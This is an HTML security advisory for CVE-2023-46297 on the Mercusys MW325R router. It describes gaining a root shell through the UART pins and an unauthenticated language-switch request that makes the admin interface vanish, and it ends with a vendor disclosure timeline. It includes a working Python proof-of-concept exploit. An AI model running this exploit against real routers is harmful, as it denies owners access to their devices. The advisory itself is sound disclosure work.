<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="./css/markdown.css">
    <meta name="description" content="exploit">
    <meta name="author" content="k4m1ll0">
    <meta name="keywords" content="Merusys, MW325R, UARTSHELL, LanaguageSwitch, RouterHacking">
    <title>Mercusys MW325R MW325R(EU)_V3_1.11.0 Build 221019(Multi-language) - CVE-2023-46297</title> 
  </head>

<body>
<article class="markdown-body">
<p><a href="https://k4m1ll0.com/advisories">Back to the advisories</a></p>

<h1>Mercusys MW325R MW325R(EU)_V3_1.11.0 Build 221019(Multi-language) - CVE-2023-46297</h1>

<div class="tags-container">
  <span class="tag-icon">#mercusys</span>
  <span class="tag-icon">#cve</span>
  <span class="tag-icon">#UARTshell</span>
  <span class="tag-icon">#HardwareHacking</span>
  <span class="tag-icon">#LanguageSwitch</span>
</div>


<div class="last-modified">
  <span>Last Modified: </span><span>2024.10.25.</span>
</div>

<p> If you find it valuable, you can support me by making a donation. <a href="https://k4m1ll0.com/donations.html">Donate now</a>.</p>

<h1> Advisory </h1>

<h2>Story</h2>

<p>I went to a local store to buy some targets. I found a cheap Mercusys (MW325R EU V3) router, after some googling in the shop I realized there are not many Mercusys vulnerabilities. 
It was a challenge, and I accepted it. It was a funny, and interesting reverse engineering project. 
On the first day, I found a funny vulnerability on the login page, at first I had no idea what is the problem. With my new HW hacking tools, I obtained a "root" shell on the device, and I figured out the root cause of the vulnerability. 
I was surprised a little bit because of the operating system. It was not a Linux operating system, it was custom-made stuff. MiniFS filesystem, no "classic" programs, there was a special debugging menu with special programs.
It was new to me, and I was sure I would enjoy it.
</p>

<img src="https://k4m1ll0.com/cve-2023-46297/02.png"/>

<img src="https://k4m1ll0.com/cve-2023-46297/07.png"/>

<img src="https://k4m1ll0.com/cve-2023-46297/11.png"/>

<p>I found multiple vulnerabilities during the reverse engineering process, and I reported them to the Vendor.
In this part, I will focus on <span class="strong-text">CVE-2023-46297</span> only.</p>

<h2>Vulnerability Description</h2>

<p>An attacker can make the admin interface "unreachable/invisible" with an HTTP request without authentication. Verification of the data sent by the user is not checked. 
The web server does not crash, but the admin interface is not visible, as the files necessary to display the content will not be available. A reboot of the router is required to restore the correct behavior. 
It is possible to restore it with another request. But for this, the vulnerability must be known.
</p>

<ul>
    <li>Hardware model: Mercusys MW325R EU V3</li>
    <li>Firmware: MW325R(EU)_V3_1.11.0 Build 221019</li>
</ul>

<img src="https://k4m1ll0.com/cve-2023-46297/13.png"/>

<p> I have published the technical details via vsociety: <a href="https://www.vicarius.io/vsociety/posts/mercusys-mw325r-reverse-engineering-part-1-root-shell-cve-2023-46297" target="_blank">https://www.vicarius.io/vsociety/posts/mercusys-mw325r-reverse-engineering-part-1-root-shell-cve-2023-46297</a> as well.</p>

<h2> Technical Details </h2>

<p>As usual, I started the task with OSINT and getting to know the software. It is important to get familiar with the device.</p>

<p>Official Firmware, Release Notes, Emulator, etc: 
<a href="https://www.mercusys.com/hu/download/mw325r" target="_blank">https://www.mercusys.com/hu/download/mw325r</a></p>

<ul>
    <li>Mercusys belongs to TP-Link.</li>
    <li>Mercusys, Qualcomm, and MediaTek have strong cooperation.</li>
    <li>Cheaper TP-Link?</li>
    <li>According to the reviews (e.g.: Amazon it is cheap and slow.)</li>
</ul>

<p>There are 3 main versions in my region, and I have version 3. For this device, there is only 1 firmware. 
There are no updates. I also checked the older versions. Version 2 has multiple firmware, added IPTV support, and bug fixes.
No vulnerability information was found.
</p>

<p>The firmware was small (only 1.6M). Binwalk did not work, the extracted size was -1.</p>

<p>I checked the communication with BURP. I found the first vulnerability while getting to know the device. 
To understand the exact reason, additional steps were necessary. Now I will only tell you the necessary steps.
</p>

<img src="https://k4m1ll0.com/cve-2023-46297/02.png"/>

<h3>The Hardware</h3>

<p>Hardware Layout</p>

<img src="https://k4m1ll0.com/cve-2023-46297/03.png"/>

<p>Mediatek MT7628KN</p>

<img src="https://k4m1ll0.com/cve-2023-46297/100.png"/>

More info: <a href="https://www.mediatek.com/products/home-networking/mt7628k-n-a" target="_blank">https://www.mediatek.com/products/home-networking/mt7628k-n-a</a>

<p>Serial Flash memory</p>

<img src="https://k4m1ll0.com/cve-2023-46297/101.png"/>

<p>Maybe useful: <a href="https://pdf1.alldatasheet.com/datasheet-pdf/view/458190/EON/EN25QH16-104HIP.html" target="_blank">https://pdf1.alldatasheet.com/datasheet-pdf/view/458190/EON/EN25QH16-104HIP.html</a>
</p>

<p>UART interface</p>

<img src="https://k4m1ll0.com/cve-2023-46297/102.png"/>

<h3>What is UART?</h3>

<p>
UART is a debugging interface. A UART channel has two data lines. 
On each device, there is an RX pin and a TX pin (RX for receive and TX for transmit). 
The RX pin of each device is connected to the TX pin of the other. Note that there is no shared clock line. 
This is the &quot;asynchronous&quot; aspect of Universal Asynchronous Receiver Transmitter. 
There is a VCC pin, but it is not important to us.
</p>

<img src="https://k4m1ll0.com/cve-2023-46297/104.png"/>

<p>More information about the protocol: 
<a href="https://vanhunteradams.com/Protocols/UART/UART.html" target="_blank">https://vanhunteradams.com/Protocols/UART/UART.html</a>
</p>

<h3>UART shell</h3>

<img src="https://k4m1ll0.com/cve-2023-46297/105.png"/>

<p>I have checked the PCB and the traces. The first two pins have traces, but the other two have not. 
The first two are <span class="strong-text">RX and TX</span>, and the third one is the <span class="strong-text">GND</span>. 
The fourth one that has a squared shape is probably the <span class="strong-text">VCC</span>.</p>

<img src="https://k4m1ll0.com/cve-2023-46297/07.png"/>

<p>I unplugged the device. I used the multimeter's continuity feature. 
I looked for the ground at the power connection, and I put one test lead of the multimeter there, and I checked the 4 pins.
One of these pins should register continuity, the third one is the GND.</p>

<p>The next step is the VCC. I plugged in the device, and I used the multimeter in voltage mode. 
I put the negative cable to the GND pin, and I checked the other pins. The squared one provided a steady and constant voltage, so it is the VCC.
</p>

<img src="https://k4m1ll0.com/cve-2023-46297/106.png"/>

<p>The fastest way to find the appropriate baud rate is by trial and error, I mostly encountered 115200, 57600, and 9600.</p>

<img src="https://k4m1ll0.com/cve-2023-46297/107.png"/>

<p>I used my USB serial converter and the &quot;screen&quot; program. The rate was 115200.</p>

<pre>
<code>
# Baud-rate is the desired baud rate setting for the RS-232 serial console port in bits per second (bps). Valid values are 110, 300, 1200, 2400, 4800, 9600, 19200, 38400, 57600, or 115200.
screen -L /dev/tty.USB0 115200
</code>
</pre>

<h3>Root shell</h3>

<p>I had a working interactive root shell. I was a little surprised, I was expecting a Linux-like OS, but the commands were quite limited. 
The file system was also strange at first, there are no commands such as &quot;cd&quot;. 
There are tasks instead of processes or programs, but more on that later. Exploitation promises to be interesting since at the end I must write my exploit.
</p>

<img src="https://k4m1ll0.com/cve-2023-46297/108.png"/>

<h3>The language-switching feature</h3>

<p>A user can change the language using the "Language Switch" feature, which does not require authentication.</p>

<img src="https://k4m1ll0.com/cve-2023-46297/109.png"/>

<p>A normal request was the following:</p>

<img src="https://k4m1ll0.com/cve-2023-46297/110.png"/>

<p>I changed the &quot;currentLanguge&quot; parameter to &quot;k4m1ll0&quot;.</p>

<p>Note: The &quot;languageList&quot; parameter is also vulnerable.</p>

<img src="https://k4m1ll0.com/cve-2023-46297/111.png"/>

<p>If we reload the page the content will be invisible to everybody. :) There will be a white page only.</p>

<img src="https://k4m1ll0.com/cve-2023-46297/112.png"/>

<p>The service is running, but the content is not visible.</p>

<p>In the debug console the problem is visible, the &quot;currentLanguage&quot; parameter is not checked properly. 
If we set the language to a non-existing language it will save the changes. 
After reloading the page will become &quot;invisible&quot;, because the necessary files do not exist.</p>

<img src="https://k4m1ll0.com/cve-2023-46297/113.png"/>

<h3>Exploit</h3>
<pre>
<code>
#!/usr/bin/python3
import requests

if __name__ == "__main__":
    URL = "http://192.168.1.1/?code=1&asyn=0"
    session = requests.session()
    # proxies = { 'http' : 'http://127.0.0.1:8080' }
    proxies = { }
    headers = { 'Content-Type' : 'text/plain;charset=UTF-8', 
                 'X-Requested-With' : 'XMLHttpRequest',
                 'Referer' : 'http://192.168.1.1' }

    data = 'id 50|1,0,0\r\n'
    data += 'currentLanguage k4m1ll0\r\n'
    data += 'languageList en_US%ch_TW\r\n'
    data += 'setByUser 0\r\n'

    session.post(URL, headers=headers, proxies=proxies, data=data)
</code>    
</pre>

<p>It creates a simple HTTP request and changes the parameter. The &quot;Referer&quot; header is important. 
It is a security feature, and it can be turned on. 
It works with the WAN interface as well, but in that case, the `Referer` and IP must changed. The &quot;proxies&quot; variable can be used for debugging.
</p>

<p>It is possible to go one level deeper and analyze the binary behind the scenes, but it is not that easy. 
We need the content of the filesystem, we need the flash content, etc.</p>

<p>In the next part, I will cover that topic as well.</p>

<h3>Video</h3>

<iframe width="1251" height="782" src="https://www.youtube.com/embed/6dvv4NYbjQw" title="Mercusys mw325r EU(V3) - CVE-2023-46297 &quot;language-switch&quot; POC" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


<h2>Disclosure timeline</h2>

<li>2023.10.17 - Vulnerability report sent to Mercusys.</li>
<li>2023.10.18 - Mercusys sent a response. They started working on it.</li>
<li>2023.10.22 - I got the following CVE number from MITRE: CVE-2023-46297.</li>
<li>2023.11.01 - Mercusys sent a test firmware. (It means they reproduced the issue.)</li>
<li>2023.11.04 - I checked the fix and it worked. I sent an update to Mercusys.</li>
<li>2023.11.04 - 2024.02.15 - Multiple discussions with the vendor. (CVE requested: CVE-2023-46297)</li>
<li>2024.05.29 - Publishing</li>

<p> &copy; 2019-2024 KamillÃ³ Matek (k4m1ll0) All Rights Reserved</p>

</article>
<footer>
</footer>
</body>
</html>
